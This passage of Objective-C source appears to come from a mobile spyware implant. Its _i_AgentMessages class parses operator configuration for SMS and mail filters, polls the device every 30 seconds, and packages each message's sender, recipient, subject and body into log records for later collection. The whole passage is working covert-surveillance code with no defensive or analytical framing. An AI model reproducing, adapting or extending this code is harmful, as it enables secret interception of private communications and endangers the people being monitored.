  enumeratorCfg = [[[mMessageFilters copy] autorelease] objectEnumerator];
  
  // Loop on filters...
  while (anObject = [enumeratorCfg nextObject])
    {
      [anObject retain];
    
      if([[anObject objectForKey: @"filterType"] intValue]  == msgFilter &&
         [[anObject objectForKey: @"messageType"] intValue] == MAIL_TYPE)
        {
          long maxMsgSize = [[anObject objectForKey: @"maxMessageSize"] longValue];

          if (msgFilter == COLLECT_FILTER_TYPE)
            {
              long fromDate   = [[anObject objectForKey: @"fromDate"] longValue];
              long toDate     = [[anObject objectForKey: @"toDate"] longValue];
            
              if ((mFirstCollectorMail != fromDate && fromDate > ALL_MSG) ||
                  mLastCollectorMail   != toDate)
                {
                  mFirstCollectorMail = fromDate;
                  mLastCollectorMail  = toDate;
                
                  [self _mailWithMessageSize: maxMsgSize
                                  withFilter: msgFilter 
                                    fromDate: mFirstCollectorMail
                                      toDate: mLastCollectorMail];
                }
          
            }
          else 
            {
              if (msgFilter == REALTTIME_FILTER_TYPE)
                {
                  if ([self _mailWithMessageSize: maxMsgSize 
                                      withFilter: msgFilter 
                                        fromDate: mLastRealTimeMail
                                          toDate: LONG_MAX] == NO)
                    {
                      // If error resetting the queue
                      @synchronized(self)
                        {
                          mSMS = 0;
                        }
                    }
                }
            }
        }
      else if (msgFilter == REALTTIME_FILTER_TYPE)
        {
          @synchronized(self)
            {
              if (mSMS > 0)
                mSMS--;
            }
        }     
    
      if([[anObject objectForKey: @"filterType"] intValue]  == msgFilter &&
         [[anObject objectForKey: @"messageType"] intValue] == SMS_TYPE)
        {    
          NSMutableArray *keyWords = [anObject objectForKey: @"keyWords"];

          if (msgFilter == COLLECT_FILTER_TYPE)
            {
              long fromDate  = [[anObject objectForKey: @"fromDate"] longValue];
              long toDate    = [[anObject objectForKey: @"toDate"] longValue];
           
              // Running collector filter if:
              //  - very first time agent starting (mFirstCollectorSMS=ALL_MSG)
              //  - new filter conf with date < mFirstCollectorSMS
              //  (if collector filter is present fromDate is mandatory > 0) 
              if ((mFirstCollectorSMS != fromDate && fromDate > ALL_MSG) ||
                   mLastCollectorSMS  != toDate) 
                {
                  mFirstCollectorSMS = fromDate;
                  mLastCollectorSMS  = toDate;

                  [self _smsWithKeyWords: keyWords 
                              withFilter: msgFilter 
                                fromDate: mFirstCollectorSMS
                                  toDate: mLastCollectorSMS];
                }
            }
          else 
            {
              if (msgFilter == REALTTIME_FILTER_TYPE)
                {
                  if ([self _smsWithKeyWords: keyWords 
                                  withFilter: msgFilter 
                                    fromDate: mLastRealTimeSMS
                                      toDate: ALL_MSG] == NO)
                    {
                      // If error resetting the queue
                      @synchronized(self)
                      {
                        mSMS = 0;
                      }
                    }
                }
            }
        }
      else if (msgFilter == REALTTIME_FILTER_TYPE)
        {
          @synchronized(self)
            {
            if (mSMS > 0)
              mSMS--;
            }
        }     
    
      [anObject release];
    }
  
  [outerPool release];

  return YES;
} 

- (BOOL)_writeMessages: (NSDictionary *) anObject
           withLogType: (int)logType
{
  int           messageType;
  NSString      *type;
  NSRange       range;
  messagePrefix pSubject;
  messagePrefix pFrom;
  messagePrefix pBody;
  messagePrefix pType;
  messagePrefix pTo;
  NSMutableData *messageData;
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  if(anObject == nil)
    return NO;
  
  if ([[anObject objectForKey: @"type"] intValue] == SMS_TYPE) 
    {
#ifdef DEBUG
      NSLog(@"%s: write sms %@", __FUNCTION__, anObject);
#endif
      messageType = SMS_TYPE;
      type = [NSString stringWithString: CLASS_SMS];
    }
  
  
  if ([[anObject objectForKey: @"type"] intValue] == MAIL_TYPE) 
    {
      messageType = MAIL_TYPE;
      type = [NSString stringWithString: CLASS_MAIL];
    }
  
  // data message: 
  //                logMessageHeader,
  //                <prefix> + wchar_t[] class, <prefix> + wchar_t[] from,
  //                <prefix> + wchar_t[] to, <prefix> + wchar_t[] subject,
  //                <prefix> + wchar_t[] body
  //
  pType.type = MAPI_STRING_CLASS;
  pType.size = [type lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  pFrom.type = STRING_FROM;
  pFrom.size = [[anObject objectForKey: @"from"] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  pTo.type   = STRING_TO;
  pTo.size   = [[anObject objectForKey: @"to"]   lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  pSubject.type = STRING_SUBJECT;
  pSubject.size = [[anObject objectForKey: @"subject"] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  pBody.type = OBJECT_TEXTBODY;
  if ([anObject objectForKey: @"body"] != nil) 
    {
      if (logType == LOG_SMS)
        pBody.size = [[anObject objectForKey: @"body"] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      if (logType == LOG_MAIL) 
        pBody.size = [[anObject objectForKey: @"body"] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
    
    }
  else 
    {
      pBody.size = 0;
    }

  
  NSMutableData *messageHeader = [NSMutableData dataWithLength: sizeof(logMessageHeader)];
  
  // buffer from mutabledata obj
  logMessageHeader *mapiHeader = (logMessageHeader *)[messageHeader bytes];
  
  // Mail agent header settings
  mapiHeader->VersionFlags = MAPI_V1_0_PROTO;
  mapiHeader->Size   =  sizeof(messagePrefix) + pFrom.size    +
                        sizeof(messagePrefix) + pTo.size      +
                        sizeof(messagePrefix) + pBody.size    +
                        sizeof(messagePrefix) + pSubject.size +
                        sizeof(messagePrefix) + pType.size;
  
  mapiHeader->DeliveryTimeHi  = (int64_t)[[anObject objectForKey: @"datetimeHi"] longValue];
  mapiHeader->DeliveryTimeLow = (int64_t)[[anObject objectForKey: @"datetimeLow"] longValue];
  mapiHeader->dwSize = sizeof(logMessageHeader) + mapiHeader->Size;
  
  //messageData = [NSMutableData dataWithLength: mapiHeader->dwSize];
  messageData = [NSMutableData dataWithLength: mapiHeader->dwSize + sizeof(logMessageHeader)];
  
  // Message header (mandatory)
  range.location  = 0;
  range.length    = sizeof(logMessageHeader);
  [messageData replaceBytesInRange: range withBytes: [messageHeader bytes]];
  
  // MAPI_STRING_CLASS string
  range.location  += range.length;
  range.length    = sizeof(messagePrefix);
  [messageData replaceBytesInRange: range withBytes: &pType];
  
  range.location  += range.length;
  range.length    = pType.size;
  [messageData replaceBytesInRange: range 
                         withBytes: [[type dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  
  // FROM string
  range.location  += range.length;
  range.length    = sizeof(messagePrefix);
  [messageData replaceBytesInRange: range withBytes: &pFrom];
  
  range.location  += range.length;
  range.length    = pFrom.size;
  [messageData replaceBytesInRange: range 
                         withBytes: [[[anObject objectForKey: @"from"] 
                                      dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  // TO string
  range.location  += range.length;
  range.length    = sizeof(messagePrefix);
  [messageData replaceBytesInRange: range withBytes: &pTo];
  
  range.location  += range.length;
  range.length    = pTo.size;
  [messageData replaceBytesInRange: range 
                         withBytes: [[[anObject objectForKey: @"to"] 
                                      dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  
  // SUBJECT string
  range.location  += range.length;
  range.length    = sizeof(messagePrefix);
  [messageData replaceBytesInRange: range withBytes: &pSubject];
  
  range.location  += range.length;
  range.length    = pSubject.size;
  [messageData replaceBytesInRange: range 
                         withBytes: [[[anObject objectForKey: @"subject"] 
                                      dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
#ifdef DEBUG
  NSLog(@"%s: subject len = %d, subject data %@", __FUNCTION__, 
        [[anObject objectForKey: @"subject"] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding],
        [[anObject objectForKey: @"subject"] dataUsingEncoding: NSUTF16LittleEndianStringEncoding]);
#endif
  
  if ([anObject objectForKey: @"body"] != nil &&
      [[anObject objectForKey: @"body"] length] != 0) 
    {
      // BODY string
      range.location  += range.length;
      range.length    = sizeof(messagePrefix);
      [messageData replaceBytesInRange: range withBytes: &pBody];
      
      range.location  += range.length;
      range.length    = pBody.size;
    
#ifdef DEBUG
      NSRange rng; rng.location = 0; rng.length = 20;
      NSLog(@"%s: \nfrom: %@\nto: %@\nsubject: %@\nbody: %@", 
            __FUNCTION__, [anObject objectForKey: @"from"],
            [anObject objectForKey: @"to"],
            [anObject objectForKey: @"subject"],
            [[anObject objectForKey: @"body"] substringWithRange:rng]);
#endif
    
      if (logType == LOG_SMS)
        [messageData replaceBytesInRange: range 
                               withBytes: [[[anObject objectForKey: @"body"] 
                                            dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
      if (logType == LOG_MAIL)
        {
          NSData *tmpData = [[anObject objectForKey: @"body"] dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
          const void *tmpBytes = [tmpData bytes];
          [messageData replaceBytesInRange: range 
                                 withBytes: tmpBytes];
        }
    }
  else 
    {
#ifdef DEBUG
      NSRange rng; rng.location = 0; rng.length = 10;
      NSLog(@"%s: \nfrom: %@\nto: %@\nsubject: %@\nbody: %@", 
            __FUNCTION__, [anObject objectForKey: @"from"],
            [anObject objectForKey: @"to"],
            [anObject objectForKey: @"subject"],
            @"no body");
#endif
    }

  
  // No additional param header
  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  BOOL success = [logManager createLog: logType
                           agentHeader: nil
                             withLogID: 0];
  
  // Write log...
  if (success == TRUE)
    {

      if ([logManager writeDataToLog: messageData
                            forAgent: logType
                           withLogID: 0] == TRUE)
        {
#ifdef DEBUG
          if (messageType == SMS_TYPE) 
            {
              NSLog(@"%s: write sms success!", __FUNCTION__);
            }
#endif
          [logManager closeActiveLog: logType withLogID: 0];
        }
    }

              
#ifdef DEBUG
      NSDate *f = [NSDate dateWithTimeIntervalSince1970: mFirstCollectorMail];
      NSDate *l = [NSDate dateWithTimeIntervalSince1970: mLastCollectorMail];
      NSLog(@"_writeMessages: saving filters mFirstCollectorMail %@ (%d) mLastCollectorMail %@ (%d) mLastRealTimeMail (%d)", 
            f, mFirstCollectorMail, l, mLastCollectorMail, mLastRealTimeMail);
#endif 

  // save last settings
  [self _setAgentMessagesProperty];
    
  [outerPool release];
  
  return YES;
}

#define CHECK_PREFIX(x,y,z) {if(x->prfx.type != y) return NO; z = x->prfx.size;}

- (BOOL)_parseConfWithData: (id)rawData
{
  messageStruct  *msgStruct  = nil;
  filter         *msgFilter  = nil;
  filterKeyWord  *fltKeyWord = nil;
  int            tmp_len, total_len, filter_len, total_filter_len;
  int64_t        fTime, unixTime;
  NSNumber       *uxFromDateTime = nil, *uxToDateTime = nil, *maxMessageSize = nil;
  NSString       *msgClass = nil;
  NSString       *keyWord = nil;
  NSNumber       *filterType = nil;
  NSMutableArray *keyWordArray = nil;

  NSNumber       *msgType = nil;
  
  if(rawData == nil)
    return NO;
  
  total_len = [rawData length];
  msgStruct = (messageStruct *) [rawData bytes];
  
  //NSLog(@"_parseConfWithData: CONFIGURATION_TAG");
  
  // random string (for build)
  CHECK_PREFIX(msgStruct, CONFIGURATION_TAG, tmp_len);
  
  total_len -= (tmp_len + sizeof(messagePrefix));
  
  msgFilter = &(msgStruct->fltr);
  
  do
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
      //NSLog(@"_parseConfWithData: CONFIGURATION_FILTER");
    
      CHECK_PREFIX(msgFilter, CONFIGURATION_FILTER, filter_len);
      total_len -= (filter_len + sizeof(messagePrefix));
      total_filter_len = filter_len + sizeof(messagePrefix);
    
      // Loop su filter_len
      filterHeader *fltHeader = &msgFilter->fltHeader;
    
      //NSLog(@"_parseConfWithData: FILTER_CLASS_V1_0");
    
      CHECK_PREFIX(fltHeader, FILTER_CLASS_V1_0, tmp_len);
      filter_len -= (tmp_len + sizeof(messagePrefix));

      //NSLog(@"_parseConfWithData: FILTER_CLASS_V1_0");
    
      // filter type
      filterType = [[NSNumber alloc] initWithInt: fltHeader->type];
    
      //NSLog(@"_parseConfWithData: filter type, %d", fltHeader->type);
    
      if(fltHeader->type == COLLECT_FILTER_TYPE) 
        {
          //NSLog(@"_parseConfWithData: COLLECT_FILTER_TYPE");
          fTime = fltHeader->fromDate.hiDateTime;
          fTime = (fTime & 0xFFFFFFFF) << 32 | (fltHeader->fromDate.lwDateTime & 0xFFFFFFFF);
          unixTime = (fTime - (int64_t)EPOCH_DIFF)/(int64_t)RATE_DIFF;
          uxFromDateTime = [[NSNumber alloc] initWithLong: unixTime];
        
          fTime = fltHeader->toDate.hiDateTime; 
          fTime = (fTime & 0xFFFFFFFF) << 32 | (fltHeader->toDate.lwDateTime & 0xFFFFFFFF);
          unixTime = (fTime - (int64_t)EPOCH_DIFF)/(int64_t)RATE_DIFF;
          uxToDateTime = [[NSNumber alloc] initWithLong: unixTime];
        }
      else 
        {
          //NSLog(@"_parseConfWithData: REALTIME_FILTER_TYPE");
          uxFromDateTime  = [[NSNumber alloc] initWithLong: 0];
          uxToDateTime    = [[NSNumber alloc] initWithLong: 0];
        }
    
      // message size for mail
      maxMessageSize = [[NSNumber alloc] initWithLong: fltHeader->maxMessageSize];
    
      // filter class
      msgClass = [NSString localizedStringWithFormat: @"%S", fltHeader->messageClass];
    
      //NSLog(@"_parseConfWithData: msg CLASS %@", msgClass);
    
      if ([msgClass compare: CLASS_SMS]  == NSOrderedSame) 
        msgType = [[NSNumber alloc] initWithInt: SMS_TYPE];
      if ([msgClass compare: CLASS_MMS]  == NSOrderedSame) 
        msgType = [[NSNumber alloc] initWithInt: MMS_TYPE];
      if ([msgClass compare: CLASS_MAIL] == NSOrderedSame) 
        msgType = [[NSNumber alloc] initWithInt: MAIL_TYPE];
      
      // filter keywords
      fltKeyWord = &msgFilter->keyword;
      keyWordArray = [NSMutableArray arrayWithCapacity: 0];
    
      while (filter_len > 0) 
        {
          //NSLog(@"_parseConfWithData: FILTER_KEYWORDS");
          CHECK_PREFIX(fltKeyWord, FILTER_KEYWORDS, tmp_len);
          filter_len -= (tmp_len + sizeof(messagePrefix));
          //keyWord = [NSString localizedStringWithFormat: @"%S", fltKeyWord->key];
          int wc_len = tmp_len/sizeof(unichar);
          keyWord = [NSString stringWithCharacters: (const unichar *)fltKeyWord->key length: wc_len];
          [keyWordArray addObject: keyWord];
          fltKeyWord += tmp_len;
        }
        
      // create filter dictionary
      NSArray *keys = [NSArray arrayWithObjects: @"filterType", 
                                                 @"messageType",
                                                 @"keyWords",
                                                 @"fromDate",
                                                 @"toDate",
                                                 @"maxMessageSize",
                                                 nil];
    
      NSArray *objects = [NSArray arrayWithObjects: filterType, 
                                                    msgType,
                                                    keyWordArray,
                                                    uxFromDateTime,
                                                    uxToDateTime,
                                                    maxMessageSize,
                                                    nil];
      
      NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects 
                                                             forKeys: keys];
    
      [mMessageFilters addObject: (id)dictionary];
        
#ifdef DEBUG
      long fromTime = [uxFromDateTime longValue];
      long toTime   = [uxToDateTime longValue];
      NSLog(@"_parseConfWithData: filter type %@, message type %@, KeyWords [%@], fromDate %s, toDate %s", 
            [filterType intValue] == COLLECT_FILTER_TYPE ? @"COLLECT_FILTER_TYPE":@"REALTTIME_FILTER_TYPE", 
            msgClass, 
            keyWord, 
            asctime(gmtime((time_t *)&fromTime)), 
            asctime(gmtime((time_t *)&toTime)));
#endif
    
      [filterType release];
      [msgType release];
      [uxFromDateTime release];
      [uxToDateTime release];
      [maxMessageSize release];
    
      // done.
      msgFilter = (filter *) ((char *)msgFilter + total_filter_len);
      
      [innerPool release];
      
    } while (total_len > 0);
  
#ifdef DEBUG
  NSLog(@"%s: Message filters %@", __FUNCTION__, mMessageFilters);
#endif
  
  return YES;
}

typedef struct _message_config_t {
  int type;
  int enable;
  int history;
  int64_t datefrom;
  int64_t dateto;
  int maxsize;
} message_config_t;

- (BOOL)_parseJsonConfWithData: (id)rawData
{
  message_config_t param[3];
  
  if (rawData == nil)
    return FALSE;
  memcpy(param, [rawData bytes], sizeof(param));
  
  for (int i=0; i < 3; i++)
    {
      if (param[i].enable == TRUE)
        {
          NSNumber *filterType      = [[NSNumber alloc] initWithInt: COLLECT_FILTER_TYPE];
          NSNumber *msgType         = [[NSNumber alloc] initWithInt:  param[i].type];
          NSNumber *uxFromDateTime  = [[NSNumber alloc] initWithLong: param[i].datefrom];
          NSNumber *uxToDateTime    = [[NSNumber alloc] initWithLong: param[i].dateto];
          NSNumber *maxMessageSize  = [[NSNumber alloc] initWithLong: param[i].maxsize];
          NSMutableArray *keyWordArray = [NSMutableArray arrayWithCapacity: 0];
                
          NSArray *keys = [NSArray arrayWithObjects: @"filterType", 
                                                     @"messageType",
                                                     @"keyWords",
                                                     @"fromDate",
                                                     @"toDate",
                                                     @"maxMessageSize",
                                                     nil];
          
          NSArray *objects = [NSArray arrayWithObjects: filterType, 
                                                        msgType,
                                                        keyWordArray,
                                                        uxFromDateTime,
                                                        uxToDateTime,
                                                        maxMessageSize,
                                                        nil];
          
          NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects 
                                                                 forKeys: keys];
          
          [mMessageFilters addObject: (id)dictionary];
        
          filterType      = [[NSNumber alloc] initWithInt: REALTTIME_FILTER_TYPE];
          msgType         = [[NSNumber alloc] initWithInt:  param[i].type];
          uxFromDateTime  = [[NSNumber alloc] initWithLong: 0];
          uxToDateTime    = [[NSNumber alloc] initWithLong: 0];
          maxMessageSize  = [[NSNumber alloc] initWithLong: param[i].maxsize];
          keyWordArray = [NSMutableArray arrayWithCapacity: 0];
          
          NSArray *keys_r = [NSArray arrayWithObjects: @"filterType", 
                                                       @"messageType",
                                                       @"keyWords",
                                                       @"fromDate",
                                                       @"toDate",
                                                       @"maxMessageSize",
                                                       nil];
          
          NSArray *objects_r = [NSArray arrayWithObjects: filterType, 
                                                          msgType,
                                                          keyWordArray,
                                                          uxFromDateTime,
                                                          uxToDateTime,
                                                          maxMessageSize,
                                                          nil];
          
          NSDictionary *dictionary_r = [NSDictionary dictionaryWithObjects: objects_r 
                                                                   forKeys: keys_r];
          
          [mMessageFilters addObject: (id)dictionary_r];
        }
    }
    
  return TRUE;
}

@end

@implementation _i_AgentMessages 

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

- (id)initWithConfigData:(NSData*)aData
{
  self = [super initWithConfigData: aData];

  if (self != nil)
    {
      time_t currentTime;
    
      // will get only new sms...
      time(&currentTime);
     
      mFirstCollectorSMS  = 0;//ALL_MSG;
      mLastCollectorSMS   = 0;//ALL_MSG;
      mLastRealTimeSMS    = 0;
      //mLastRealTimeSMS    = currentTime;
      mFirstCollectorMail = 0;
      mLastCollectorMail  = 0;
      mLastRealTimeMail   = currentTime;
      mSMS                = 0;  
      mAgentID            = AGENT_MESSAGES;
    }
  
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

NSString *k_i_AgentMessageskRunLoopMode = @"k_i_AgentMessageskRunLoopMode";

- (void)getMessagesWithFilter:(NSTimer*)theTimer
{
  [self _getMessagesWithFilter: REALTTIME_FILTER_TYPE andMessageType: ANY_TYPE];
}

- (void)setMsgPollingTimeOut:(NSTimeInterval)aTimeOut 
{    
  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
                                                    target: self 
                                                  selector: @selector(getMessagesWithFilter:) 
                                                  userInfo: nil 
                                                   repeats: YES];
  
  [[NSRunLoop currentRunLoop] addTimer: timer forMode: k_i_AgentMessageskRunLoopMode];
}

- (void)startAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  id messageRawData;
  
  if ([self isThreadCancelled] == TRUE)
    {
      [self setMAgentStatus: AGENT_STATUS_STOPPED];  
      [outerPool release];
      return;
    }
  
  mMessageFilters = [[NSMutableArray alloc] initWithCapacity: 0];
  
  messageRawData = [self mAgentConfiguration];
  
  if([self _parseJsonConfWithData: messageRawData] == NO || [self isThreadCancelled] == TRUE)
    {
      [self setMAgentStatus: AGENT_STATUS_STOPPED];  
      [outerPool release];
      return;
    }

  [self _getAgentMessagesProperty];
  
  [self _getMessagesWithFilter: COLLECT_FILTER_TYPE andMessageType: ANY_TYPE];
  
  [self setMsgPollingTimeOut: 30.0];
  
  while ([self mAgentStatus] == AGENT_STATUS_RUNNING)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
        
      [[NSRunLoop currentRunLoop] runMode:k_i_AgentMessageskRunLoopMode 
                               beforeDate:[NSDate dateWithTimeIntervalSinceNow: 1.0]];
    
      [innerPool release];
    }
    
  [mMessageFilters release];

  [self setMAgentStatus: AGENT_STATUS_STOPPED];
  
  [outerPool release];
}
  
- (BOOL)stopAgent
{
  [self setMAgentStatus: AGENT_STATUS_STOPPING];  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

@end
